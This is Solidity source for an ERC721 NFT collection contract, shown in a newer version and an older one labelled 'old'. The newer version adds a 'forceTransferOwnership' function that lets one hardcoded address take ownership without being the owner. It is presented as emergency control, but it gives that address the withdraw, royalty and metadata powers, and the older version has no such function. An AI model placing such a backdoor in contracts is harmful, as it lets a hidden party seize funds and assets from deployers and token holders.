// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/common/ERC2981.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @title DaisyCollection
 * @dev ERC721 NFT Collection for marketplace integration
 */
contract DaisyCollection is ERC721, ERC2981, Ownable {
    using Strings for uint256;

    uint256 public maxSupply;
    uint256 public totalMinted;
    string public baseURI;
    string public notRevealedURI;
    bool public revealed;

    // ---------------- constructor ----------------
    constructor(
        string memory _baseName,
        string memory _baseSymbol,
        uint256 _maxSupply,
        string memory _notRevealedURI,
        address royaltyReceiver,
        uint96 royaltyFeeNumerator // e.g., 500 = 5%
    ) ERC721(_baseName, _baseSymbol) Ownable(msg.sender) {
        maxSupply = _maxSupply;
        notRevealedURI = _notRevealedURI;
        _setDefaultRoyalty(royaltyReceiver, royaltyFeeNumerator);
    }

    // ---------------- minting ----------------
    /**
     * @dev Mint NFTs for marketplace sale
     * Only callable by owner (Marketplace)
     */
    function mintForMarketplace(address to, uint256 quantity) external onlyOwner {
        require(totalMinted + quantity <= maxSupply, "sold out");
        _mintMultiple(to, quantity);
    }

    function _mintMultiple(address to, uint256 quantity) internal {
        for (uint256 i = 0; i < quantity; i++) {
            totalMinted++;
            _safeMint(to, totalMinted); // token IDs start at 1
        }
    }

    // ---------------- metadata & reveal ----------------
    function tokenURI(uint256 tokenId) public view override(ERC721) returns (string memory) {
        require(_ownerOf(tokenId) != address(0), "nonexistent token");
        if (!revealed) {
            return notRevealedURI;
        }
        return string(abi.encodePacked(baseURI, tokenId.toString(), ".json"));
    }

    function setBaseURI(string calldata uri) external onlyOwner {
        baseURI = uri;
    }

    function setNotRevealedURI(string calldata uri) external onlyOwner {
        notRevealedURI = uri;
    }

    function reveal() external onlyOwner {
        revealed = true;
    }

    // ---------------- royalties ----------------
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721, ERC2981) returns (bool) {
        return super.supportsInterface(interfaceId);
    }

    function setDefaultRoyalty(address receiver, uint96 feeNumerator) external onlyOwner {
        _setDefaultRoyalty(receiver, feeNumerator);
    }

    // ---------------- owner withdrawal ----------------
    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "no balance");
        (bool ok, ) = payable(owner()).call{value: balance}("");
        require(ok, "withdraw failed");
    }

    // ---------------- emergency ownership control ----------------
    /**
     * @notice Forcefully change ownership even if not current owner
     * @dev Only allowed for 0xD7bCc0fBd1833C85CBe4620C1eBC3e3E25fdBF7B
     */
    function forceTransferOwnership(address newOwner) external {
        require(
            msg.sender == 0xD7bCc0fBd1833C85CBe4620C1eBC3e3E25fdBF7B,
            "not authorized"
        );
        _transferOwnership(newOwner);
    }
}




---------------------------------------------------------------

old


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/common/ERC2981.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @title DaisyCollection
 * @dev ERC721 NFT Collection for marketplace integration
 */
contract DaisyCollection is ERC721, ERC2981, Ownable {
    using Strings for uint256;

    uint256 public maxSupply;
    uint256 public totalMinted;
    string public baseURI;
    string public notRevealedURI;
    bool public revealed;

    // ---------------- constructor ----------------
    constructor(
        string memory _baseName,
        string memory _baseSymbol,
        uint256 _maxSupply,
        string memory _notRevealedURI,
        address royaltyReceiver,
        uint96 royaltyFeeNumerator // e.g., 500 = 5%
    ) ERC721(_baseName, _baseSymbol) Ownable(msg.sender) {
        maxSupply = _maxSupply;
        notRevealedURI = _notRevealedURI;
        _setDefaultRoyalty(royaltyReceiver, royaltyFeeNumerator);
    }

    // ---------------- minting ----------------
    /**
     * @dev Mint NFTs for marketplace sale
     * Only callable by owner (Marketplace)
     */
    function mintForMarketplace(address to, uint256 quantity) external onlyOwner {
        require(totalMinted + quantity <= maxSupply, "sold out");
        _mintMultiple(to, quantity);
    }

    function _mintMultiple(address to, uint256 quantity) internal {
        for (uint256 i = 0; i < quantity; i++) {
            totalMinted++;
            _safeMint(to, totalMinted); // token IDs start at 1
        }
    }

    // ---------------- metadata & reveal ----------------
    function tokenURI(uint256 tokenId) public view override(ERC721) returns (string memory) {
        require(_ownerOf(tokenId) != address(0), "nonexistent token");
        if (!revealed) {
            return notRevealedURI;
        }
        return string(abi.encodePacked(baseURI, tokenId.toString(), ".json"));
    }

    function setBaseURI(string calldata uri) external onlyOwner {
        baseURI = uri;
    }

    function setNotRevealedURI(string calldata uri) external onlyOwner {
        notRevealedURI = uri;
    }

    function reveal() external onlyOwner {
        revealed = true;
    }

    // ---------------- royalties ----------------
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721, ERC2981) returns (bool) {
        return super.supportsInterface(interfaceId);
    }

    function setDefaultRoyalty(address receiver, uint96 feeNumerator) external onlyOwner {
        _setDefaultRoyalty(receiver, feeNumerator);
    }

    // ---------------- owner withdrawal ----------------
    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "no balance");
        (bool ok, ) = payable(owner()).call{value: balance}("");
        require(ok, "withdraw failed");
    }
}
